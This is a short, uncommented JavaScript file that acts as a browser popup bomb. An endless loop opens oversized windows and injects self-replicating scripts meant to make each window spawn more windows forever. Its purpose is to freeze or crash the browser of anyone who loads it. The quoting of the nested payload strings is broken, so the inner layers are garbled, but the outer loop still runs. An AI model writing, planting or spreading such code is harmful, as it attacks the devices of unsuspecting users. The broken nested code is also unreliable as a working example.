function h(){
	const w = window.open('','','width=20000,height=10000');
    const script= document.createElement('script');
    const data="function o(){const w = window.open('','','width=20000,height=10000');const script=document.createElement('script');script.innerHTML='while(true){window.open('','','width=10000,height=20000')}';w.document.body.appendChild(script);}; while(true){o();}";
    const eve = `function o(){const w = window.open('','','width=20000,height=10000');const script=document.createElement('script');script.innerHTML='${data}';w.document.body.appendChild(script);};while(true){o();}`
    script.innerHTML=`function o(){const w = window.open('','','width=200000,height=100000');const script=document.createElement('script');script.innerHTML='${eve}';w.document.body.appendChild(script);};while(true){o();}`;   
    w.document.body.appendChild(script);
}
while(true){h();}
